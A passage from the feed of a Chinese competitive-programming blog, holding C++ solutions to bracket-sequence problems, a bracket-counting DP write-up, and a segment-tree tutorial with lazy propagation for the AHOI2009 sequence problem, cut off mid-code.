class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>,q=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>)q++;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;(&#x27;</span>)cnt++;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;)&#x27;</span>)cnt--;</span><br><span class="line">        <span class="keyword">if</span>(q+cnt==<span class="number">1</span>)&#123;</span><br><span class="line">            q=<span class="number">0</span>;</span><br><span class="line">            cnt=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt==q)<span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还是太菜了qwq</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这次的比赛没打，但是自己打估计就是自闭上去的。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>牛客多校(2022-7-23)题解</title>
    <link href="http://example.com/2022/07/23/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1(2022-7-23)%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2022/07/23/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1(2022-7-23)%E9%A2%98%E8%A7%A3/</id>
    <published>2022-07-23T09:00:00.000Z</published>
    <updated>2022-07-23T12:45:15.741Z</updated>
    
    <content type="html"><![CDATA[<p>牛客多校碰到毒瘤括号dp题，题解记录一下。</p><span id="more"></span><h2 id="K题目描述"><a href="#K题目描述" class="headerlink" title="K题目描述"></a>K题目描述</h2><p><img src="/2022/07/23/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1(2022-7-23)%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>给定长度为n的括号序列（不保证合法性），求在此基础上生成的长度为m括号序列的方案数。</p><p>设 $dp[i][j][k]$表示插入括号的数量为 $i$、使用的原来的序列中的括号数量为 $j$，左括号比右括号多 $k$ 时的方案数。那么最终答案为 $dp[m-nl[n][0]$。那么考虑如何设计状态转移：</p><p>首先枚举插入的括号数量，原来的括号序列和左括号比右括号多的数量。<br>如果目前枚举到的括号为左括号，并且使用的原括号的数量$&lt; n$，就可以将该括号放入最终序列中，即为：<br>$$<br>dp[i][j+1][k+1]=(dp[i][j+1][k+1]+dp[i][j][k])%mod<br>$$<br>如果此时枚举到的是一个右括号，并且$k&gt;0$，即左括号的数量大于右括号的数量，并且使用的原括号的数量$&lt;n$，就将该右括号放入最终序列：<br>$$<br>dp[i][j+1][k-1]=(dp[i][j+1][k-1]+dp[i][j][k])%mod<br>$$<br>如果使用的括号数量为 $n$，或当前枚举到右括号，则可以插入左括号：<br>$$<br>dp[i+1][j][k+1]=(dp[i+1][j][k+1]+dp[i][j][k])%mod<br>$$<br>当 $k&gt;0$ 时，如果使用原序列括号的数目为 $n$，或当前枚举到左括号，则可以插入右括号：<br>$$<br>dp[i+1][j][k-1]=(dp[i+1][j][k-1]+dp[i][j][k])%mod<br>$$</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> gcc optimize(2)</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&#x27;\n&#x27;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">2e5</span> + <span class="number">10</span>, mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">220</span>][<span class="number">220</span>][<span class="number">220</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//memset(dp, 0, sizeof(dp));</span></span><br><span class="line">    <span class="keyword">int</span> n, m; cin &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    string s; cin &gt;&gt; s;</span><br><span class="line">    <span class="comment">//if(n &amp; 1 || (m - n) &amp; 1) &#123; cout &lt;&lt; 0 &lt;&lt; endl; return; &#125;</span></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n - m; ++i)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= m; ++j)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= n; ++k)&#123;</span><br><span class="line">            <span class="keyword">if</span> (s[j] == <span class="string">&#x27;(&#x27;</span> &amp;&amp; j &lt; m)</span><br><span class="line">                dp[i][j + <span class="number">1</span>][k + <span class="number">1</span>] = (dp[i][j + <span class="number">1</span>][k + <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[i + <span class="number">1</span>][j][k + <span class="number">1</span>] = (dp[i + <span class="number">1</span>][j][k + <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">            <span class="keyword">if</span> (k &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (s[j] == <span class="string">&#x27;)&#x27;</span> &amp;&amp; j &lt; m)</span><br><span class="line">                    dp[i][j + <span class="number">1</span>][k - <span class="number">1</span>] = (dp[i][j + <span class="number">1</span>][k - <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i + <span class="number">1</span>][j][k - <span class="number">1</span>] = (dp[i + <span class="number">1</span>][j][k - <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">cout &lt;&lt; dp[n - m][m][<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n + <span class="number">2</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= m + <span class="number">2</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= n + <span class="number">2</span>; k++) dp[i][j][k] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios_base::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>), cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> t = <span class="number">1</span>; cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span>(t--) <span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;牛客多校碰到毒瘤括号dp题，题解记录一下。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="牛客多校" scheme="http://example.com/categories/icpc/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>线段树专题训练</title>
    <link href="http://example.com/2022/07/21/%E7%BA%BF%E6%AE%B5%E6%A0%91%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83/"/>
    <id>http://example.com/2022/07/21/%E7%BA%BF%E6%AE%B5%E6%A0%91%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83/</id>
    <published>2022-07-21T07:00:00.000Z</published>
    <updated>2022-07-21T08:16:21.221Z</updated>
    
    <content type="html"><![CDATA[<p>练一下线段树专题吧，本篇博客持续更新！</p><span id="more"></span><h1 id="线段树"><a href="#线段树" class="headerlink" title="线段树"></a>线段树</h1><p>线段树是算法竞赛中常用的用来维护 <strong>区间信息</strong> 的数据结构。</p><p>线段树可以在 $O(\log N)$ 的时间复杂度内实现单点修改、区间修改、区间查询（区间求和，求区间最大值，求区间最小值）等操作。</p><p>线段树维护的信息在很多时候可以认为是满足（幺）半群的性质的信息。</p><p>一个幺半群 $M=(S,\circ ,e)$，其中 $\circ$ 为在集合 $S$ 上定义的二元运算符，幺半群具有以下性质：</p><ul><li>封闭性：$\forall x\in S$ 和 $\forall y\in S$ 有 $x\circ y\in S$。</li><li>结合律：$\forall x,y,z\in S$ 有 $(x\circ y)\circ z=x\circ (y\circ z)$。</li><li>存在幺元：即 $\exists e\in S$ 满足 $\forall x \in S$ 有 $e\circ x=x$，$e$ 为左幺元；或 $x\circ e=x$，$e$ 为右幺元。</li></ul><p>我们观察到线段树上的信息一般满足这样的性质，一些数域上的加法与乘法自然，考虑二元的 $\max(x,y)$ 运算，此时幺元为 $-\infty$ 也满足这样的性质（一般左右幺元相同时简称为幺元）。</p><p>线段树将每个长度不为 $1$ 的区间划分成左右两个区间递归求解，把整个线段划分为一个树形结构，通过合并左右两区间信息来求得该区间的信息。这种数据结构可以方便的进行大部分的区间操作。</p><p>有个大小为 $5$ 的数组 $a={10,11,12,13,14}$，要将其转化为线段树，有以下做法：设线段树的根节点编号为 $1$，用数组 $d$ 来保存我们的线段树，$d_i$ 用来保存线段树上编号为 $i$ 的节点的值（这里每个节点所维护的值就是这个节点所表示的区间总和）。</p><p>我们先给出这棵线段树的形态，如图所示：</p><p><img src="/2022/07/21/%E7%BA%BF%E6%AE%B5%E6%A0%91%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83/segt1.svg"></p><p>图中每个节点中用红色字体标明的区间，表示该节点管辖的 $a$ 数组上的位置区间。如 $d_1$ 所管辖的区间就是 $[1,5]$（$a_1,a_2, \cdots ,a_5$），即 $d_1$ 所保存的值是 $a_1+a_2+ \cdots +a_5$，$d_1=60$ 表示的是 $a_1+a_2+ \cdots +a_5=60$。</p><p>通过观察不难发现，$d_i$ 的左儿子节点就是 $d_{2\times i}$，$d_i$ 的右儿子节点就是 $d_{2\times i+1}$。如果 $d_i$ 表示的是区间 $[s,t]$（即 $d_i=a_s+a_{s+1}+ \cdots +a_t$) 的话，那么 $d_i$ 的左儿子节点表示的是区间 $[ s, \frac{s+t}{2} ]$，$d_i$ 的右儿子表示的是区间 $[ \frac{s+t}{2} +1,t ]$。</p><p>在实现时，我们考虑递归建树。设当前的根节点为 $p$，如果根节点管辖的区间长度已经是 $1$，则可以直接根据 $a$ 数组上相应位置的值初始化该节点。否则我们将该区间从中点处分割为两个子区间，分别进入左右子节点递归建树，最后合并两个子节点的信息。（以上来自wiki）</p><p>在进行区间操作的时候，我们一般不会把状态更新到每个节点，如果更新，那么一次操作最大的复杂度会是 $O(n)$。因此我们会采取懒惰标记的方式去记录这次的操作，如果这次更新完整地包含了一个区间，那么我们对这个区间打上懒惰标记，不继续往下更新，若要查询，则会将懒惰标记加到对应的节点上去。可以证明，每一次操作不会超过4个区间，加上区间操作是从上往下延的，那么一次操作理论最坏的情况应该是 $O(log_2n)$，非常符合我们的要求。查询复杂度同理，也是 $O(log_2n)$。</p><p>这里需要注意几点：</p><h2 id="懒惰标记怎么打？"><a href="#懒惰标记怎么打？" class="headerlink" title="懒惰标记怎么打？"></a>懒惰标记怎么打？</h2><p>当当前区间完全包含于我要操作的区间，这个时候可能会有点疑问，这个区间的值我是加或者不加，我的懒惰标记肯定会给到这个区间，但是这个值加不加，懒惰标记给到了，那么一个区间带了一个懒惰标记，它的值到底是意味着加了还是没加呢？因为感觉理论上好像都可行的，但是这里实际情况是：要加！因为我区间的值会被更新到父亲节点，如果我不加，那么更新上去的节点值就是错误的。因此此时我一定要把值加上去。那么一个区间带了懒惰标记它的含义是：我自己的值已经加上去了，但是我的儿子区间和孙子，曾孙子区间都没加上这个值，等会过来的时候都需要加上，那么带了懒惰标记的那个区间是已经加上了的。</p><p>所以懒惰标记什么含义一定要搞清楚，不能模棱两可，不能，不能！！！</p><h2 id="什么时候push-down"><a href="#什么时候push-down" class="headerlink" title="什么时候push down"></a>什么时候push down</h2><p>懒惰标记下传的操作我们叫 <code>push_down</code>。什么时候需要呢？我们理解了懒惰标记的含义之后，我们就清楚了，带了懒惰标记的区间，本身已经加上了值，只是儿子都没加上去。那么如果我直接再对整个区间操作，需不需要 <code>push_down</code> 呢？不需要，因为这个区间已经是真实值了，但是我在对一个带有懒惰标记的区间的儿子区间尝试进行操作的时候呢？那肯定需要了！因为儿子区间还不是真实值，还得加上父亲给它的懒惰标记才是。</p><p>那么我们 <code>push_down</code> 一次就会把一个区间的懒惰标记清零，给对应的两个儿子区间加上对应的值，并把懒惰标记分发给他们。</p><h1 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h1><h2 id="P2023-AHOI2009-维护序列"><a href="#P2023-AHOI2009-维护序列" class="headerlink" title="P2023 [AHOI2009] 维护序列"></a>P2023 [AHOI2009] 维护序列</h2><h3 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h3><p>老师交给小可可一个维护数列的任务，现在小可可希望你来帮他完成。</p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>有一个长为 $n$ 的数列 ${a_n}$，有如下三种操作形式：</p><ol><li>格式 <code>1 t g c</code>，表示把所有满足 $t\le i\le g$ 的 $a_i$ 改为 $a_i\times c$ ;</li><li>格式 <code>2 t g c</code> 表示把所有满足 $t\le i\le g$ 的 $a_i$ 改为 $a_i+c$ ;</li><li>格式 <code>3 t g</code> 询问所有满足 $t\le i\le g$ 的 $a_i$ 的和，由于答案可能很大，你只需输出这个数模 $p$ 的值。</li></ol><h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h3><p>第一行两个整数 $n$ 和 $p$。</p><p>第二行含有 $n$ 个非负整数，表示数列 ${a_i}$ 。</p><p>第三行有一个整数 $m$，表示操作总数。</p><p>从第四行开始每行描述一个操作，同一行相邻两数之间用一个空格隔开，每行开头和末尾没有多余空格。</p><h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h3><p>对每个操作 3，按照它在输入中出现的顺序，依次输出<strong>一行一个整数</strong>表示询问结果。</p><h3 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h3><h4 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">7 43</span><br><span class="line">1 2 3 4 5 6 7</span><br><span class="line">5</span><br><span class="line">1 2 5 5</span><br><span class="line">3 2 4</span><br><span class="line">2 3 7 9</span><br><span class="line">3 1 3</span><br><span class="line">3 4 7</span><br></pre></td></tr></table></figure><h4 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">35</span><br><span class="line">8</span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><h4 id="样例输入输出-1-解释"><a href="#样例输入输出-1-解释" class="headerlink" title="样例输入输出 1 解释"></a>样例输入输出 1 解释</h4><ul><li>初始时数列为 ${1,2,3,4,5,6,7}$。</li><li>经过第 $1$ 次操作后，数列为 ${1,10,15,20,25,6,7}$。</li><li>对第 $2$ 次操作，和为 $10+15+20=45$，模 $43$ 的结果是 $2$。</li><li>经过第 $3$ 次操作后，数列为 ${1,10,24,29,34,15,16}$。</li><li>对第 $4$ 次操作，和为 $1+10+24=35$，模 $43$ 的结果是 $35$。</li><li>对第 $5$ 次操作，和为 $29+34+15+16=94$，模 $43$ 的结果是$8$。</li></ul><h4 id="数据规模与约定"><a href="#数据规模与约定" class="headerlink" title="数据规模与约定"></a>数据规模与约定</h4><p>测试数据规模如下表所示：</p><table><thead><tr><th align="center">数据点编号</th><th align="center">1</th><th align="center">2</th><th align="center">3</th><th align="center">4</th><th align="center">5</th><th align="center">6</th><th align="center">7</th><th align="center">8</th><th align="center">9,10</th></tr></thead><tbody><tr><td align="center">$n=$</td><td align="center">$10$</td><td align="center">$1000$</td><td align="center">$1000$</td><td align="center">$10000$</td><td align="center">$60000$</td><td align="center">$70000$</td><td align="center">$80000$</td><td align="center">$90000$</td><td align="center">$100000$</td></tr><tr><td align="center">$m=$</td><td align="center">$10$</td><td align="center">$1000$</td><td align="center">$1000$</td><td align="center">$10000$</td><td align="center">$60000$</td><td align="center">$70000$</td><td align="center">$80000$</td><td align="center">$90000$</td><td align="center">$100000$</td></tr></tbody></table><p>对于全部的测试点，保证 $0 \leq p, a_i, c \leq 10^9$，$1 \leq t \leq g \leq n$。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>是一个线段树的翻版题，只不过要取模，并且有乘法，乘法其实跟加法一样，如果区间里的数都乘上一个数，那么其实就相当于先和再乘，乘法懒惰标记默认应该为1。因为既有加法也有乘法，因此我们需要两个懒惰标记，当懒惰标记乘上去时，加法的懒惰标记应该对应要乘上去，在push_down的时候，我们先乘，再加即可。</p><h2 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> n,p;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">    <span class="keyword">int</span> lazy1;</span><br><span class="line">    <span class="keyword">int</span> lazy2;</span><br><span class="line">&#125;tree[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    tree[now].l=l;</span><br><span class="line">    tree[now].r=r;</span><br><span class="line">    tree[now].lazy1=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        tree[now].sum=a[r];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">build</span>(now&lt;&lt;<span class="number">1</span>,l,mid);</span><br><span class="line">    <span class="built_in">build</span>(now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    tree[now].sum=(tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum)%p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_lazy</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> lazy1,<span class="keyword">int</span> lazy2)</span></span>&#123;</span><br><span class="line">    tree[i].sum*=lazy1;</span><br><span class="line">    tree[i].sum%=p;</span><br><span class="line">    tree[i].sum+=(tree[i].r-tree[i].l+<span class="number">1</span>)*lazy2;</span><br><span class="line">    tree[i].sum%=p;</span><br><span class="line">    tree[i].lazy1*=lazy1;</span><br><span class="line">    tree[i].lazy2*=lazy1;</span><br><span class="line">    tree[i].lazy1%=p;</span><br><span class="line">    tree[i].lazy2%=p;</span><br><span class="line">    tree[i].lazy2+=lazy2;</span><br><span class="line">    tree[i].lazy2%=p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push_down</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lazy1=tree[i].lazy1,lazy2=tree[i].lazy2;</span><br><span class="line">    tree[i].lazy1=<span class="number">1</span>;</span><br><span class="line">    tree[i].lazy2=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">add_lazy</span>(i&lt;&lt;<span class="number">1</span>,lazy1,lazy2);</span><br><span class="line">    <span class="built_in">add_lazy</span>(i&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,lazy1,lazy2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;query(%lld,%lld,%lld)\n&quot;,l,r,now);</span></span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[now].l&amp;&amp;r&gt;=tree[now].r)&#123;</span><br><span class="line">        ans+=tree[now].sum;</span><br><span class="line">        <span class="comment">//printf(&quot;sum=%d\n&quot;,tree[now].sum);</span></span><br><span class="line">        ans%=p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">push_down</span>(now);</span><br><span class="line">        <span class="keyword">int</span> mid=tree[now].l+tree[now].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">query</span>(l,r,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">query</span>(l,r,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum;</span><br><span class="line">        tree[now].sum%=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[now].l&amp;&amp;r&gt;=tree[now].r)&#123;</span><br><span class="line">        <span class="built_in">add_lazy</span>(now,<span class="number">1</span>,num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">push_down</span>(now);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> mid=tree[now].l+tree[now].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span 